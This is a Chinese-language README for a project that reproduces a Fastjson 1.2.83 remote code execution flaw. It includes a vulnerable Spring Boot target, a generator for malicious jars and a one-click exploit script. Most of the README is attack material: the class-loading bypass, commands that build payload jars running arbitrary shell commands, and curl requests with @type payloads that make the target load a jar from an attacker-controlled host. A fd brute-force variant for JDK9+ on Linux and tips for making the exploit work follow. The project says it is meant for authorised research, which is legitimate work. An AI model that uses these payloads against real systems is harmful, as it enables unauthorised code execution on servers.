# Fastjson 1.2.83 RCE 研究环境

对 **Fastjson 1.2.83 远程代码执行漏洞（2026 年公开）** 的学习与复现环境，包含：

- 一个可复现漏洞的 **Spring Boot 靶场**（`/1283` 解析入口）
- 一套生成恶意 jar 的 **PoC 工具**（`PoC/`）
- 一键攻击脚本 `exp.py`

> ⚠️ **仅限授权环境 / 本地靶场测试**。本项目仅用于安全研究、漏洞复现与防御验证，禁止用于未授权系统。

---

## 目录结构

```
fastjson/
├── pom.xml                        # 靶场 Maven 配置（fastjson 1.2.83, Spring Boot 2.7.18）
├── exp.py                         # 二阶段（jar:file fd 爆破）一键攻击脚本
├── src/main/
│   ├── java/com/example/
│   │   ├── Application.java       # 靶场入口
│   │   └── controller/Fastjson_1283.java   # POST /1283 → JSON.parse
│   └── resources/application.properties
├── PoC/                           # 攻击 jar 生成工具（独立 Maven 项目）
│   ├── pom.xml                    # 依赖: asm 9.6, javassist 3.29.2-GA
│   └── src/main/java/PoC_1283/
│       ├── JavassistGen.java      # 核心: javassist 生成"@JSONType + <clinit>"恶意类
│       ├── GenHttpProbe.java      # 一阶段: 生成 jar:http 远程加载的 probe
│       └── GenFileProbe.java      # 二阶段: 生成 fd1~fd100 候选 jar（爆破用）
└── www/                           # 攻击 jar 产物（gitignore，不提交）
```

## 漏洞背景

Fastjson 1.x 的 `ParserConfig.checkAutoType` 在解析 `@type` 时，会把类名 `replace('.','/') + ".class"` 交给 ClassLoader 做资源探测，并检查字节码是否带 `@JSONType` 注解。攻击者可把 `@type` 伪装成资源路径：

```
@type = jar:http:..<IP_INT>:<PORT>.<jar>!.POC
     ↓ replace('.','/')
资源  = jar:http://<IP>:<PORT>/<jar>!/POC.class
```

### 关键：两个 ClassLoader，两个环节

`checkAutoType` 里**下载**和**加载**用的是不同的 ClassLoader：

```java
// ① 资源探测（下载 jar）—— 用 ParserConfig.class.getClassLoader()
is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
//    fatjar 启动下 = LaunchedURLClassLoader → 支持 jar: 协议 → 下载远程 jar → 检测 @JSONType → jsonType=true

// ② 类加载（defineClass + <clinit>）—— 用 TCCL（defaultClassLoader 为 null 时）
clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
//    内部回退到 Thread.currentThread().getContextClassLoader().loadClass(...)
```

- **下载**（①）始终能用 LaunchedURLClassLoader 发起网络请求（SSRF 下载 jar）。
- **加载**（②）能否完成取决于 TCCL 是否支持 `jar:http` / `jar:file` 类加载。

### 单payload RCE（`jar:http://`，JDK8）

让 loadClass 走 **LaunchedURLClassLoader**（如 `Thread.currentThread().setContextClassLoader(ParserConfig.class.getClassLoader())`），则 ② 能加载远程类 → `<clinit>` 一次执行 → RCE。

**前提：JDK8**。JDK9+ 的 `verify_legal_class_name` 拒绝类名含连续 `//`，一阶段只能 SSRF。

### 两阶段RCE（配合`jar:file:/proc/self/fd/N`，Linux，fatjar通杀）

默认 TCCL（`TomcatEmbeddedWebappClassLoader`）无法完成 `jar:http` 类加载，但：

1. ① 已把 jar 下载到 `%TMP%/jar_cache*.tmp`（Linux 上 JVM 删除文件但 **fd 保持打开**）
2. 用 `jar:file:/proc/self/fd/N!/E_N` 从 fd 读回 jar 里的类 → 类名不含 `://` → **JDK9+ 也能过校验**

```json
{"@type":"jar:file:.proc.self.fd.11!.E11","x":1}
```

由于 fd 号未知，jar 里预置 fd1~fd100 的候选类（`E_N`，this_class = `jar:file:/proc/self/fd/N!/E_N`）逐个爆破。

### 利用条件与限制

| 路径                                            | 条件 |
|-----------------------------------------------|---|
| **一阶段** `jar:http://`                         | **JDK 8** + fatjar + loadClass 走 Launched（`setContextClassLoader`/`setDefaultClassLoader`） |
| **二阶段** `jar:http + jar:file` | **Linux**（`/proc/self/fd`）+ **JDK 8 / 9+ 均可用** |
| 通用                                            | fastjson 1.2.66~1.2.83；Spring Boot FatJar 运行；SafeMode 未启用 |

> 详见 `PoC/` 下各工具的注释。

## 快速开始

### 1. 靶场

```bash
mvn package -DskipTests
java -jar target/fastjson-1.0-SNAPSHOT.jar
# 监听 4125，入口 POST /1283
```

### 2. 生成攻击 jar

```bash
cd PoC
mvn package -DskipTests                      # 依赖 asm/javassist 自动下载
mvn -q dependency:build-classpath -Dmdep.outputFile=cp.txt   # 生成依赖 classpath
CP="target/classes;$(cat cp.txt)"

# 一阶段RCE（jar:http）—— 三种输入任选：
java -cp "$CP" PoC_1283.GenHttpProbe --host 192.168.50.1 --port 11111 --jar probe --cmd "calc"
java -cp "$CP" PoC_1283.GenHttpProbe --code 'new File("D:/tmp/x").createNewFile();'
java -cp "$CP" PoC_1283.GenHttpProbe --code-file payload.java

# 二阶段RCE（fd1~fd100 爆破，Linux）：
java -cp "$CP" PoC_1283.GenFileProbe --cmd "touch /tmp/pwned"
```

> `--cmd`：执行命令（默认 `/bin/sh -c`）；`--code`：直接 Java 代码；`--code-file`：从文件读代码（复杂逻辑推荐）。

### 3. 攻击

**一阶段（JDK8 靶机）**：
```bash
curl -X POST http://TARGET:4125/1283 -H 'Content-Type: application/json' \
  --data '{"@type":"jar:http:..<IP_INT>:11111.probe!.POC","x":1}'
```

**二阶段（JDK9+ / Linux 靶机）**：
```bash
# 先起本地 HTTP 提供 probe_file（默认 :11111）
python3 exp.py --url http://192.168.50.2:18080/parse
```

## 已知坑

- **javassist 必须 ≥ 3.27**：老版本（如 3.1）不生成 `StackMapTable`，JDK8 字节码校验会报 `Illegal class name`。
- **恶意 jar 必须用 ASM/javassist 生成**：`this_class` 是 `jar:` 开头的非法 Java 类名，`javac` 编不了；手改二进制常量池容易错。
- **一阶段 IP 用整数**（`127.0.0.1` → `2130706433`），避免被 `replace('.','/')` 破坏。
- **每次测试前重启靶场**，JVM 会缓存 jar URL / 类加载结果。

## License

暂无，仅供学习研究。
